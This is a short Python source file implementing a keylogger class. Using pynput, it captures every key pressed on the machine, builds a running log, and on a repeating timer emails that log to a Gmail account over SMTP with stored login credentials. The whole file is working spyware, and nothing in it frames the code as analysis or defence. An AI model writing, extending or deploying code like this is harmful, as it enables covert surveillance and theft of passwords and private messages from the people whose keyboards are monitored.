#! /usr/bin/env python

import pynput.keyboard
import threading,smtplib

class Keylogger:
    def __init__(self,time_interval,email,passwdd):
        self.log="Keylogger Started"
        self.interval=time_interval
        self.email=email
        self.password=passwdd

    def append_to_log(self,string):
        self.log=self.log + string

    def process_key_press(self,key):
        try:
            current_key=str(key.char)
        except AttributeError:
            if key== key.space:
                current_key=" "
            else:
                current_key=" "+ str(key)+ " "
        self.append_to_log(current_key)

    def send_mail(self,email,password,message):
        server=smtplib.SMTP("smtp.gmail.com",587) #create a smtp sevrer
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)#from ,to, message
        server.quit()

    def report(self):
        self.send_mail(self.email,self.password,"\n\n"+self.log)
        self.log=""
        timer=threading.Timer(self.interval,self.report)
        timer.start()

    def start(self):
        keyboard_listner = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listner:
            self.report()
            keyboard_listner.join()

